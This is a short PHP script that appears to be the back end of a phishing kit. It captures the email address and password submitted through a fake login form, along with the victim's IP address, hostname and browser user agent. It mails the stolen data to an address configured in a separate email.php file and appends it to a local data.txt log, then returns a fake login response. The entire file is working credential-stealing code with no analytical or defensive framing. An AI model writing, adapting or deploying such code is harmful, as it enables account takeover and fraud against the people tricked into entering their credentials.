<?php
include 'email.php';
$email = trim($_POST['ai']);
$password = trim($_POST['pr']);

if($email != "" || $password != "" ){
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "------------------------------------\n";
	$message .= "em           : ".$email."\n";
	$message .= "pr              : ".$password."\n";
	$message .= "------------------------------------\n";
	$message .= $ip."\n";
	$message .= "--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "UserAg : ".$useragent."\n";
	$message .= "-------------------------\n";
	$send = $Receive_email;
	$subject = "RES : $ip";
    	mail($send, $subject, $message); 
    	$data = "\n".$message;
		chmod("../data.txt", 0755); 
		$fp = fopen('../data.txt', 'a+');
		fwrite($fp, $data);
		fclose($fp);
	$signal ='ok';
	$msg ='InValid Credentials';
}
else{
	$signal='bad';
	$msg='Please fill in all the fields.';
}
echo json_encode(["login"=> true]);

?>